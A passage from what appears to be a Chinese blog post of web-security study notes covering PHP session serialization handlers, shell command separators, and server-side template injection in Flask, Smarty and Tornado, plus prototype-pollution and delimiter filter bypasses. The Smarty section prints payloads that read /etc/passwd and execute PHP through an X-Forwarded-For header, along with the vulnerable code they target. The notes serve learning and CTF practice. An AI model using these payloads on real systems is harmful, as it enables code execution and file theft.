<th align="center">对应的存储格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php</td>
<td align="center">键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_binary</td>
<td align="center">键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td align="center">php_serialize (php&gt;&#x3D;5.5.4)</td>
<td align="center">经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody></table>
<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p>首先来看看默认<code>session.serialize_handler = php</code>时候的序列化结果，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="https://image.3001.net/images/20220311/1646988663_622b0d779748192aba6f7.png!small"><img src="https://image.3001.net/images/20220311/1646988663_622b0d779748192aba6f7.png!small" alt="img"></a></p>
<p>为了方便查看，将<code>session</code>存储目录设置为<code>session.save_path = &quot;/www/php_session&quot;</code>，<code>PHPSESSID</code>文件如下</p>
<p>1、文件名</p>
<p>文件名为<code>sess_mpnnbont606f50eb178na451od</code>，其中<code>mpnnbont606f50eb178na451od</code>就是后续请求头中<code>Cookie</code>携带的<code>PHPSESSID</code>的值 (如上图浏览器中已存储)</p>
<p>2、文件内容</p>
<p>php处理器存储格式</p>
<table>
<thead>
<tr>
<th align="center">键名</th>
<th align="center">竖线</th>
<th align="center">经过 serialize() 函数反序列处理的值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$_SESSION[‘name’]的键名：name</td>
<td align="center">|</td>
<td align="center">s:6:”harden”;</td>
</tr>
</tbody></table>
<h5 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h5><p>使用php_binary处理器，即<code>session.serialize_handler = php_binary</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment"># 为了方便ACSII显示，将键名设置为36个字符长度</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于三种方式<code>PHPSESSID</code>文件名都是一样的，这里只需要查看文件内容</p>
<p><a data-fancybox="gallery" data-src="https://image.3001.net/images/20220311/1646988665_622b0d79304714550f427.png!small"><img src="https://image.3001.net/images/20220311/1646988665_622b0d79304714550f427.png!small" alt="img"></a></p>
<table>
<thead>
<tr>
<th align="center">键名的长度对应的 ASCII 字符</th>
<th align="center">键名</th>
<th align="center">经过 serialize() 函数反序列处理的值.</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$</td>
<td align="center">namenamenamenamenamenamenamenamename</td>
<td align="center">s:6:”harden”;</td>
</tr>
</tbody></table>
<h5 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h5><p>使用php_binary处理器，即<code>session.serialize_handler = php_serialize</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件内容即经过 serialize() 函数反序列处理的数组，<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p>
<p><a data-fancybox="gallery" data-src="https://image.3001.net/images/20220311/1646988666_622b0d7a2a04733d2da9c.png!small"><img src="https://image.3001.net/images/20220311/1646988666_622b0d7a2a04733d2da9c.png!small" alt="img"></a></p>
<h2 id="十二、rce"><a href="#十二、rce" class="headerlink" title="十二、rce"></a>十二、rce</h2><blockquote>
<p>“<code>|</code>”:管道符，前面命令标准输出，后面命令的标准输入。例如：help |more</p>
<p>“<code>&amp;</code>” commandA <code>&amp;</code> commandB 先运行命令<code>A</code>，然后运行命令<code>B</code> </p>
<p>“<code>||</code>” commandA <code>||</code> commandB 运行命令<code>A</code>，如果失败则运行命令<code>B</code> </p>
<p>“<code>&amp;&amp;</code>” commandA <code>&amp;&amp;</code> commandB 运行命令<code>A</code>，如果成功则运行命令<code>B</code></p>
</blockquote>
<h2 id="十三、ssti"><a href="#十三、ssti" class="headerlink" title="十三、ssti"></a>十三、ssti</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11425368.html">参考文章</a></p>
</blockquote>
<p>根据下图，推测不同的模板注入，然后使用不同的注入方法</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220903123146044.png"><img src="/Web-study/image-20220903123146044.png" alt="image-20220903123146044"></a></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220903123047693.png"><img src="/Web-study/image-20220903123047693.png" alt="image-20220903123047693"></a></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51353029/article/details/111503731">原文链接1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/219913.html">原文链接2</a></p>
<p><u><strong>注，由于 转义内容 Hexo使用Nunjucks渲染帖子（较早的版本使用Swig，它们具有相似的语法）。用<code>&#123; &#123; &#125; &#125;</code>或<code>&#123; ％ ％ &#125;</code>包装的内容将被解析，并可能导致问题。您可以使用原始标签插件包装敏感内容。</strong></u></p>
<p>这里是把所有{  {}  }和 {  %% }，没有空格，替换成有空格的，才能上传博客</p>
</blockquote>
<h3 id="关于基于flask的SSTI漏洞的阶段学习小结："><a href="#关于基于flask的SSTI漏洞的阶段学习小结：" class="headerlink" title="关于基于flask的SSTI漏洞的阶段学习小结："></a>关于基于flask的SSTI漏洞的阶段学习小结：</h3><h4 id="SSTI的理解："><a href="#SSTI的理解：" class="headerlink" title="SSTI的理解："></a>SSTI的理解：</h4><p>SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。</p>
<h4 id="SSTI引发的真正原因："><a href="#SSTI引发的真正原因：" class="headerlink" title="SSTI引发的真正原因："></a>SSTI引发的真正原因：</h4><p>render_template渲染函数的问题</p>
<h4 id="render-template渲染函数是什么："><a href="#render-template渲染函数是什么：" class="headerlink" title="render_template渲染函数是什么："></a>render_template渲染函数是什么：</h4><p>就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。</p>
<h4 id="render-template："><a href="#render-template：" class="headerlink" title="render_template："></a>render_template：</h4><p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染，<br>即：{  {}  }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{  {}  }包裹的内容当做变量解析替换。比如{  {1+1}  }会被解析成2。因此才有了现在的模板注入漏洞。往往变量我们使用{  {这里是内容}  }<br>真因为{  {}  }包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞</p>
<p><code>注入的思想：</code></p>
<blockquote>
<p>用函数不断调用我们要使用的命令如：file、read、open、ls等等命令，我们用这些来读取写入配置文件；</p>
</blockquote>
<h3 id="Smarty-SSTI利用"><a href="#Smarty-SSTI利用" class="headerlink" title="Smarty SSTI利用"></a>Smarty SSTI利用</h3><p>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p>
<h4 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h4><p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30</p>
<h4 id="常规利用方式"><a href="#常规利用方式" class="headerlink" title="常规利用方式"></a>常规利用方式</h4><h5 id="php-php-标签"><a href="#php-php-标签" class="headerlink" title="{php}{&#x2F;php}标签"></a>{php}{&#x2F;php}标签</h5><p>Smarty支持使用{php}{&#x2F;php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{&#x2F;php}标签会报错：</p>
<p><a data-fancybox="gallery" data-src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg"><img src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg" alt="v2-a24770cd727d793d93abd89d5025ad41_hd.j"></a></p>
<p>在Smarty3的官方手册里有以下描述:</p>
<blockquote>
<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
</blockquote>
<p>该题目使用的是Smarty类，所以只能另寻它路。</p>
<h5 id="literal-标签"><a href="#literal-标签" class="headerlink" title="{literal} 标签"></a>{literal} 标签</h5><p>官方手册这样描述这个标签：</p>
<blockquote>
<p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
</blockquote>
<p>那么对于php5的环境我们就可以使用</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>来实现PHP代码的执行，但这道题的题目环境是PHP7，这种方法就失效了。</p>
<h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><p>通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span>  (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> =  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span>  (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，很多文章里给的payload都形如：{self::getStreamVariable(“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”)}。然而使用这个payload会触发报错如下：</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error <span class="keyword">in</span> template  <span class="string">&quot;string:&lt;meta http-equiv=&quot;</span>...<span class="string">&quot;&gt;Current  IP:&#123;self::getStreamVariable(‘file:///etc/passwd’)&#125;&quot;</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="string">&#x27;self&#x27;</span>  <span class="keyword">is</span> <span class="literal">undefined</span> <span class="keyword">or</span> <span class="keyword">not</span> allowed <span class="keyword">by</span> security setting &lt;-- thrown <span class="keyword">in</span>  /<span class="keyword">var</span>/www/html/smarty/libs/sysplugins/smarty_internal_templatecompilerbase.php <span class="literal">on</span> line <span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<h5 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h5><p>官方文档中看到这样的描述：</p>
<blockquote>
<p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}. 也可以使用{else} 和 {elseif}. </p>
<p>全部的PHP条件表达式和函数都可以在if内使用，<br>如*||*, or, &amp;&amp;, and, is_array(), 等等</p>
</blockquote>
<p>既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？</p>
<p>将XFF头改为{if phpinfo()}{&#x2F;if}，可以看到题目执行了phpinfo()</p>
<p><a data-fancybox="gallery" data-src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg"><img src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg" alt="v2-bddead1f721c42eed678d9db9527c0e7_hd.j"></a></p>
<p>用同样的方法可以轻松获得flag</p>
<p>题目漏洞代码</p>
<p>通过getshell之后的文件读取，本题中引发SSTI的代码简化后如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);<span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();<span class="variable">$ip</span> =  <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h3 id="Tornado-SSTI利用"><a href="#Tornado-SSTI利用" class="headerlink" title="Tornado SSTI利用"></a>Tornado SSTI利用</h3><p><strong>tornado是用Python编写的Web服务器兼Web应用框架</strong>，简单来说就是用来生成模板的东西。和Python相关，和模板相关</p>
<blockquote>
<p> Tornado模板支持控制语句和表达式。</p>
<p> 控制语句被{ % % }, e.g. { % if len(items) &gt; 2 %}</p>
<p> 表达式被{ { } }, e.g. { { items[0] } }.</p>
</blockquote>
<p><strong>render()<strong>是tornado里的函数，</strong>可以生成html模板。是一个渲染函数</strong>，就是一个公式，<strong>能输出前端页面的公式。</strong></p>
<p><strong>Tornado</strong>框架的附属文件<strong>handler.settings</strong>中存在<strong>cookie_secret</strong></p>
<p><strong>Handler</strong>这个对象，<u>Handler指向的处理当前这个页面的RequestHandler对象</u></p>
<blockquote>
<p><code>RequestHandler</code>中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性</p>
<p>handler 指向RequestHandler</p>
<p>而RequestHandler.settings又指向self.application.settings</p>
<p>所有handler.settings就指向RequestHandler.application.settings了！</p>
</blockquote>
<h3 id="绕过过滤-1"><a href="#绕过过滤-1" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><h4 id="proto-绕过"><a href="#proto-绕过" class="headerlink" title="__proto__绕过"></a><code>__proto__</code>绕过</h4><blockquote>
<h4 id="proto-被过滤，用constructor-prototype绕过"><a href="#proto-被过滤，用constructor-prototype绕过" class="headerlink" title="__proto__被过滤，用constructor.prototype绕过"></a><code>__proto__</code>被过滤，用constructor.prototype绕过</h4><blockquote>
<p>在JavaScript中，每个对象都有一个名为 <code>__proto__</code> 的内置属性，它指向该对象的原型。对象的原型是另一个对象，它有自己的 <code>__proto__</code> 属性，指向它的原型，这样就形成了一条链，称为原型链。使用 <code>__proto__</code> 属性可以访问和修改对象的原型。</p>
<p>在某些情况下，开发人员可能希望过滤掉对象的 <code>__proto__</code> 属性，以增强安全性或避免潜在的问题。但是，这并不意味着通过其他方式就无法访问对象的原型了。</p>
<p><code>constructor.prototype</code> 是一种访问对象原型的替代方法。当创建一个函数时，会自动创建一个名为 <code>prototype</code> 的属性，并将其设置为一个空对象。当使用该函数作为构造函数创建新对象时，该对象的 <code>__proto__</code> 属性将被设置为构造函数的 <code>prototype</code> 属性的值。因此，可以使用 <code>constructor.prototype</code> 访问该对象的原型，而无需使用 <code>__proto__</code> 属性。</p>
<p>尽管 <code>constructor.prototype</code> 可以绕过对 <code>__proto__</code> 的过滤，但它本质上与 <code>__proto__</code> 是相同的，因此也可能存在潜在的安全问题，需要在代码编写时进行注意。</p>
</blockquote>
</blockquote>
<h4 id="分隔符绕过"><a href="#分隔符绕过" class="headerlink" title="分隔符绕过"></a>分隔符绕过</h4><blockquote>
<p>利用模板渲染参数，将delimiter分割参数渲染覆盖，使得原有的标签从<code>&lt;%=</code>变成<code>&lt;?=</code>【<code>http://xx/?delimiter=?</code>】，故而正则匹配对<code>&lt;%=</code>的限制就绕过了</p>
</blockquote>

    </div>

    
    
    
      


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item"></div>
      <div class="post-nav-item">
    <a href="/Noteless/" rel="next" title="web基础随记">
      web基础随记 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">基础漏洞知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81sql%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.1.</span> <span class="nav-text">一、sql漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-sql%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.sql漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1"><span class="nav-number">1.1.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81xss%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.2.</span> <span class="nav-text">二、xss漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-xss%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.xss漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81csrf%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.3.</span> <span class="nav-text">三、csrf漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-csrf%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.csrf漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-2"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-2"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81xxe%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.4.</span> <span class="nav-text">四、xxe漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-xxe%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.xxe漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-3"><span class="nav-number">1.4.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-3"><span class="nav-number">1.4.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81ssrf%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.5.</span> <span class="nav-text">五、ssrf漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-ssrf%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.5.1.</span> <span class="nav-text">1.ssrf漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-4"><span class="nav-number">1.5.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-4"><span class="nav-number">1.5.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.6.</span> <span class="nav-text">六、文件上传漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.6.1.</span> <span class="nav-text">1.文件上传漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-5"><span class="nav-number">1.6.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-5"><span class="nav-number">1.6.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.7.</span> <span class="nav-text">七、文件包含漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.7.1.</span> <span class="nav-text">1.文件包含漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-6"><span class="nav-number">1.7.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-6"><span class="nav-number">1.7.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.8.</span> <span class="nav-text">八、逻辑漏洞漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.8.1.</span> <span class="nav-text">1.逻辑漏洞漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-7"><span class="nav-number">1.8.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-7"><span class="nav-number">1.8.3.</span> <span class="nav-text">3.防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9"><span class="nav-number">1.8.3.1.</span> <span class="nav-text">1.任意密码修改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">1.8.3.2.</span> <span class="nav-text">2.越权访问</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%AF%87"><span class="nav-number">1.9.</span> <span class="nav-text">九、命令执行漏洞篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.9.1.</span> <span class="nav-text">1.命令执行漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8D%B1%E5%AE%B3-8"><span class="nav-number">1.9.2.</span> <span class="nav-text">2.危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E9%98%B2%E5%BE%A1-8"><span class="nav-number">1.9.3.</span> <span class="nav-text">3.防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%AF%87"><span class="nav-number">1.10.</span> <span class="nav-text">十、暴力破解篇</span></a><ol 